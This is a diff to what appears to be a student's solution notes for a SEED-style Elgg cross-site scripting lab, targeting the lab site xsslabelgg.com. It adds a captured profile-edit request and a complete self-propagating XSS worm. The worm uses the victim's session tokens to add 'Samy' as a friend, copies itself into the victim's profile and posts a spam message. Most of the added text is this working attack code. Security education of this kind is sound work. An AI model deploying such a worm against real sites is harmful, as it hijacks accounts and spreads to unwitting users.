@@ -136,9 +136,93 @@ accesslevel%5Btwitter%5D=1
 guid=44
 
 
+__elgg_token=p4-BoxpgGwZIWf4t8X00Zw&__elgg_ts=1624341405&name=seed+ubuntu&description=seed+ubuntu&accesslevel%5Bdescription%5D=1&briefdescription=1605062&accesslevel%5Bbriefdescription%5D=1&location=seed+ubuntu&accesslevel%5Blocation%5D=1&interests=seed+ubuntu&accesslevel%5Binterests%5D=1&skills=seed+ubuntu&accesslevel%5Bskills%5D=1&contactemail=killmeh%40gmail.com&accesslevel%5Bcontactemail%5D=1&phone=seed+ubuntu&accesslevel%5Bphone%5D=1&mobile=seed+ubuntu&accesslevel%5Bmobile%5D=1&website=https%3A%2F%2Fwww.killmeh.com%2Fwebsite&accesslevel%5Bwebsite%5D=1&twitter=seed+ubuntu&accesslevel%5Btwitter%5D=1&guid=44
+
+
 wire post link: http://www.xsslabelgg.com/action/thewire/add
 content:
 __elgg_token=sWqZS3M83yWXeu6D5soKsw&__elgg_ts=1624257309&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy
+
+//solution 4
+<script id="worm" type="text/javascript">
+window.onload = function () {
+	if(elgg.session.user.guid!=elgg.page_owner.guid)
+	{
+		//alert('XSS');
+		var Ajax=null;
+		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+		var token="&__elgg_token="+elgg.security.token.__elgg_token;
+				
+
+
+		//Construct the HTTP request to add Samy as a friend.
+		var sendurl1 = "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token+ts+token;
+		//console.log(sendurl);
+	
+	
+
+		//Create and send Ajax request to add friend
+		Ajax=new XMLHttpRequest();
+		/*Ajax.onreadystatechange = function() {
+				//if (xhr.readyState === 4) {
+				 // callback(xhr.response);
+				//}
+				console.log(Ajax.readyState);
+				console.log(Ajax.response);			
+		}*/	
+		Ajax.open("GET",sendurl1,true);
+		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+		Ajax.send();
+
+
+
+		var guid = "&guid="+elgg.session.user.guid;
+		var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+		var jsCode = document.getElementById("worm").innerHTML;
+		var tailTag = "</" + "script>";
+		var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+		console.log(wormCode);
+		//Construct the content of your url.
+		var sendurl2="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
+		var content2=ts+token+"&name=seed+ubuntu&description="+wormCode+"&accesslevel%5Bdescription%5D=1&briefdescription=1605062&accesslevel%5Bbriefdescription%5D=1&location=seed+ubuntu&accesslevel%5Blocation%5D=1&interests=seed+ubuntu&accesslevel%5Binterests%5D=1&skills=seed+ubuntu&accesslevel%5Bskills%5D=1&contactemail=killmeh%40gmail.com&accesslevel%5Bcontactemail%5D=1&phone=seed+ubuntu&accesslevel%5Bphone%5D=1&mobile=seed+ubuntu&accesslevel%5Bmobile%5D=1&website=https%3A%2F%2Fwww.killmeh.com%2Fwebsite&accesslevel%5Bwebsite%5D=1&twitter=seed+ubuntu&accesslevel%5Btwitter%5D=1"+guid //FILL IN
+
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl2,true);
+		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+		Ajax.send(content2);
+
+		
+
+		var sendurl3="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
+		var content3=token+ts+"&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy"; //FILL IN
+		
+
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl3,true);
+		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+		Ajax.setRequestHeader("Content-Type",
+		"application/x-www-form-urlencoded");
+		Ajax.send(content3);
+	
+
+
+
+
+
+	}
+	
+}
+</script>
+
+
+
+
+
+
+
+
 //solution 3
 
 
